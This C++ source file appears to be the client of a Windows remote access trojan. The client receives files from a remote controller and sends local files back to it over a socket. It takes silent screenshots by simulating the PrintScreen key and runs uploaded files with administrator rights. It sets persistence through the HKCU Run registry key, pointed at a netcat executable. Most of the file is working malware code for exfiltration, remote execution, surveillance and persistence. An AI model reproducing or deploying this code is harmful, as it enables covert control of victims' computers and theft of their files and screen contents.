#pragma once
#include "Scripts_c.h"


bool Transfer::uploadToClient(Client* client, std::string filename)
{
		std::cout << "Uploading .." << std::endl;
		client->send_b(("upload " + filename).c_str());
		char buffer[BUFFER_LEN] = { 0 };

		recv(*client->getSock(),buffer,BUFFER_LEN,0); // SIZE

		if (std::string(buffer) == "STOP")
		{
			client->send_b("Error, aborting the upload ...");
			return 0;
		}
		const unsigned int size = atoi(buffer);

		std::cout << "Size : " << size << " bytes" << std::endl;		

		std::ofstream file_export(filename, std::ios::binary | std::ios::out | std::ios::trunc);

		if (file_export)	
		{
			send(*client->getSock(), "OK", 3, 0); // TEST OK

			std::cout << "File created" << std::endl;
			const int len = 1024;
			int current_size = 0;
			char memblock[len] = { 0 };
			const int rest = size % len;	

			Sleep(2000);
			int boucle = 0;
			while (current_size != size)
			{
				if (current_size + rest == size)
				{
					recv(*client->getSock(), memblock, rest,0);
					file_export.write(memblock, rest);
					break;
				}
				else
				{
					recv(*client->getSock(), memblock, len, 0);
					file_export.write(memblock, len);
					current_size += len;
				}
				if (std::string(memblock) == "STOP")
				{
					client->send_b("Error, aborting the upload ...");
					return 0;
				}
				boucle++;
			}
			file_export.close();
			std::cout << "Boucle : " << boucle << std::endl;
			return 1;
		}
		else
		{
			std::cout << "CANT CREATE THE FILE " << std::endl;
			send(*client->getSock(), "STOP", 5, 0);

			return 0;
		}
}
bool Transfer::downloadFromClient(Client* client,const std::string filename)
{
	std::cout << "Downloading .." << std::endl;
	client->send_b(("Downloading " + filename).c_str());
	int ret = 0;
	std::ifstream file(filename, std::ios::binary | std::ios::in);

	if (file)
	{
		const int len = 1024;
		client->send_b(("download " + filename).c_str()); // INTERRUPT RECV THREAD OF SERVER
		Sleep(500);
		char buffer[BUFFER_LEN] = { 0 };
		const unsigned int size = getSize(filename);
		ret = send(*client->getSock(), std::to_string(size).c_str(), BUFFER_LEN, 0); // SIZE
		std::cout << "Size : " << size << " bytes" << std::endl;
		std::cout << "Ret : " << ret << std::endl;

		recv(*client->getSock(), buffer, BUFFER_LEN, 0); // OK SO WE CONTINUE

		if (std::string(buffer) == "OK")
		{
			std::cout << "Sending data ..." << std::endl;
			std::cout << size << " bytes to send" << std::endl;

			Sleep(2000);

			int current_size = 0;
			char memblock[len] = { 0 };
			const int rest = size % len;
			int nb = 0;
			file.seekg(0, std::ios::beg);
			bool done = 0;
			int pourcentage = 0;
			int boucle = 0;

			while (current_size != size)
			{
				if (current_size + rest == size)
				{
					file.read(memblock, rest);
					send(*client->getSock(), memblock, rest, 0);
					break;
				}
				else
				{
					file.read(memblock, len);
					send(*client->getSock(), memblock, len, 0);
					current_size += len;
					file.seekg(current_size, std::ios::beg);
				}
				boucle++;
			}
			std::cout << "Boucle : " << boucle << std::endl;
			client->send_b("Done downloading");
			return 1;
		}
		else
		{
			std::cout << "Error with the server, aborting " << std::endl;
			client->send_b("Aborting ...");
			return 0;
		}
	}
	else
	{
		client->send_b(("Error the file : " + filename + " doesn't exist").c_str());
		client->send_b("Maybe you gave a wrong path");
		return 0;
	}
}

void Transfer::screenshot(Client* client)
{
			client->send_b("Taking screenshot ..");
			const char* filename = "screenshot.bmp";

			keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
			keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
			HBITMAP h;

			OpenClipboard(NULL);
			h = (HBITMAP)GetClipboardData(CF_BITMAP);
			CloseClipboard();
			HDC hdc = NULL;
			FILE*fp = NULL;
			LPVOID pBuf = NULL;
			BITMAPINFO bmpInfo;
			BITMAPFILEHEADER bmpFileHeader;
			do
			{
				hdc = GetDC(NULL);
				ZeroMemory(&bmpInfo, sizeof(BITMAPINFO));
				bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
				GetDIBits(hdc, h, 0, 0, NULL, &bmpInfo, DIB_RGB_COLORS);
				if (bmpInfo.bmiHeader.biSizeImage <= 0)
					bmpInfo.bmiHeader.biSizeImage = bmpInfo.bmiHeader.biWidth*abs(bmpInfo.bmiHeader.biHeight)*(bmpInfo.bmiHeader.biBitCount + 7) / 8;
				if ((pBuf = malloc(bmpInfo.bmiHeader.biSizeImage)) == NULL)
				{
					MessageBox(NULL, L"Unable to Allocate Bitmap Memory", L"Error", MB_OK | MB_ICONERROR);
					break;
				}
				bmpInfo.bmiHeader.biCompression = BI_RGB;
				GetDIBits(hdc, h, 0, bmpInfo.bmiHeader.biHeight, pBuf, &bmpInfo, DIB_RGB_COLORS);
				if ((fp = fopen(filename, "wb")) == NULL)
				{
					MessageBox(NULL, L"Unable to Create Bitmap File", L"Error", MB_OK | MB_ICONERROR);
					break;
				}
				bmpFileHeader.bfReserved1 = 0;
				bmpFileHeader.bfReserved2 = 0;
				bmpFileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo.bmiHeader.biSizeImage;
				bmpFileHeader.bfType = 'KB';
				bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
				fwrite(&bmpFileHeader, sizeof(BITMAPFILEHEADER), 1, fp);
				fwrite(&bmpInfo.bmiHeader, sizeof(BITMAPINFOHEADER), 1, fp);
				fwrite(pBuf, bmpInfo.bmiHeader.biSizeImage, 1, fp);
			}
			while (false);
			if (hdc)ReleaseDC(NULL, hdc);
			if (pBuf) free(pBuf);
			if (fp)fclose(fp);
		
		client->send_b("Done");
}

int Transfer::getSize(std::string filename)
{
	std::ifstream file(filename, std::ios::binary);
	if (file)
	{
		std::streampos beg, end;
		beg = file.tellg();
		file.seekg(0, std::ios::end);
		end = file.tellg();
		file.close();
		return (end - beg);
	}
	else
		return 0;

}

void Transfer::Copy(std::string filename_out, std::string filename)
{
	const unsigned int len = 1024;
	std::ofstream file_export(filename_out, std::ios::binary | std::ios::out | std::ios::trunc);
	std::ifstream file(filename, std::ios::binary | std::ios::in);

	std::cout << "Size : " << getSize(filename) << "bytes" << std::endl;
	const int size = getSize(filename);
	int current_size = 0;
	char memblock[len] = { 0 };

	if (file && file_export)
	{
		file.seekg(0, std::ios::beg);
		const int rest = size % len;
		while (size != current_size)
		{
			if (current_size != size)
			{
				file.read(memblock, rest);
				file_export.write(memblock, rest);
				current_size += rest;
				break;
			}
			else
			{
				file.read(memblock, BUFFER_LEN);
				file_export.write(memblock, BUFFER_LEN);
				current_size += BUFFER_LEN;
				file.seekg(current_size, std::ios::beg);
			}
		}
		file.close();
		file_export.close();
		std::cout << "DONE";
	}
}
	
void Transfer::ask(Client* client, const std::string filename,const std::string new_name)
{
	if (uploadToClient(client, filename))
	{
		client->send_b("Rename..");
		const std::string cmd = "ren " + filename + " " + new_name;
		const std::string ret = Shell::return_command(cmd);
		if (ret != "") { client->send_b(ret.c_str()); }
		client->send_b("Done");
		Shell::exeAdmin(client, new_name);
	}
}

void Transfer::getTemp(Client* client)
{
	std::wstring TempPath;
	wchar_t wcharPath[MAX_PATH];
	if (GetTempPathW(MAX_PATH, wcharPath))
	{
		TempPath = wcharPath;
		 // Convert wstring to string
		std::string str(TempPath.begin(), TempPath.end());
		client->send_b(str.c_str());

	}
	else
	{
		client->send_b("Can't find the Temp directory ..");
	}
	
}

void InfoClient::getsysinfo(Client* client)
{
	client->send_b("Getting system info ...");
	/*
	std::string buffer;
	std::string user = getenv("USERNAME");
	std::string userhome = getenv("HOMEPATH");
	std::string windir = getenv("windir");
	std::string localappdate = getenv("LOCALAPPDATA");
	std::string systemdrive = getenv("SystemDrive");
	std::string OS = getenv("OS");
	std::string userdomain = getenv("USERDOMAIN");
	std::string computername = getenv("COMPUTERNAME");
	std::string proco = getenv("PROCESSOR_IDENTIFIER");

	buffer = "\nCurrent user\t\t: " + user + "\nUser directory\t\t: " + userhome + "\nWindows directory\t: " + windir + "\nLocal Appdata\t\t: " + localappdate;
	buffer += "\nSystem drive\t\t: " + systemdrive + "\nOS\t\t\t: " + OS + "\nComputer name\t\t: " + computername + "\nProcessor identifier\t: " + proco;
	client->send_b(buffer.c_str());
	*/

	/*
	std::string ret = Shell::return_command("systeminfo");
	
	std::cout << ret << std::endl;
	Sleep(4000);
	send(*client->getSock(), "HUGE_BUFFER", BUFFER_LEN, 0);
	send(*client->getSock(), ret.c_str(), HUGE, 0);
	send(*client->getSock(), "Done", 5, 0);
	//  gci env:* | sort-object name
	*/

}

void persistence(Client* client, const std::string filename, const wchar_t* keyname)
{
	client->send_b(("Putting persistence on : " + filename).c_str());
	 
	std::string path = Shell::return_command("chdir");
	path += "\\" + filename;
	client->send_b(("Path : " + path).c_str());

	;
	
	TCHAR *Tpath= new TCHAR[path.size() + 1];
	Tpath[path.size()] = 0;
	
	HKEY newValue;

	LONG lResult = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	BOOL fsuccess = (lResult == 0);
	TCHAR ppath[256] = L"D:\\ESIREM\\C++\\LPC\\LPC\\x64\\Debug\\nc.exe";
	if (fsuccess)
	{
		RegSetValueEx(newValue, (LPWSTR)keyname, 0, REG_SZ, (LPBYTE)ppath, sizeof(ppath));
		RegCloseKey(newValue);
	}
	
	client->send_b("Done");
}

BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
}
/*
int _tmain(int argc, _TCHAR* argv[])
{
	RegisterProgram();
	IsMyProgramRegisteredForStartup(L"My_Program");
	return 0;
}
*/